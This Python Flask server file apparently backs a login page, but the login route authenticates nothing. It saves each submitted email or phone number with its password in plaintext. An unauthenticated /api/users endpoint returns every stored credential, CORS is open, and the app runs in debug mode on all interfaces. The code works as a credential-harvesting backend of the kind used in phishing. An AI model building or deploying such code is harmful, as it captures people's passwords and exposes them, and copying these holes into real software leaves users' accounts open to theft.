from flask import Flask, request, jsonify, send_from_directory
from flask_cors import CORS
import sqlite3
import os
from datetime import datetime

app = Flask(__name__, static_folder='static')
CORS(app)

DB_PATH = os.path.join(os.path.dirname(__file__), 'users.db')


def init_db():
    """Initialize the SQLite database and create the users table."""
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            login_type TEXT NOT NULL,
            email TEXT,
            phone_number TEXT,
            password TEXT NOT NULL,
            remember_password INTEGER DEFAULT 0,
            created_at TEXT NOT NULL
        )
    ''')
    conn.commit()
    conn.close()


@app.route('/')
def index():
    """Serve the login page."""
    return send_from_directory('static', 'index.html')


@app.route('/api/login', methods=['POST'])
def login():
    """Handle login form submission and save details to the database."""
    data = request.get_json()

    login_type = data.get('login_type', 'email')
    email = data.get('email', '')
    phone_number = data.get('phone_number', '')
    password = data.get('password', '')
    remember_password = 1 if data.get('remember_password', False) else 0
    created_at = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    if not password:
        return jsonify({'success': False, 'message': 'Password is required'}), 400

    if login_type == 'email' and not email:
        return jsonify({'success': False, 'message': 'Email is required'}), 400

    if login_type == 'phone' and not phone_number:
        return jsonify({'success': False, 'message': 'Phone number is required'}), 400

    try:
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO users (login_type, email, phone_number, password, remember_password, created_at)
            VALUES (?, ?, ?, ?, ?, ?)
        ''', (login_type, email, phone_number, password, remember_password, created_at))
        conn.commit()
        conn.close()

        return jsonify({'success': True, 'message': 'Login details saved successfully'}), 200
    except Exception as e:
        return jsonify({'success': False, 'message': str(e)}), 500


@app.route('/api/users', methods=['GET'])
def get_users():
    """Retrieve all saved login entries (for admin/debugging)."""
    try:
        conn = sqlite3.connect(DB_PATH)
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()
        cursor.execute('SELECT * FROM users ORDER BY created_at DESC')
        rows = cursor.fetchall()
        conn.close()

        users = [dict(row) for row in rows]
        return jsonify({'success': True, 'users': users}), 200
    except Exception as e:
        return jsonify({'success': False, 'message': str(e)}), 500


if __name__ == '__main__':
    init_db()
    print('Database initialized.')
    print('Server running at http://localhost:5000')
    app.run(debug=True, host='0.0.0.0', port=5000)
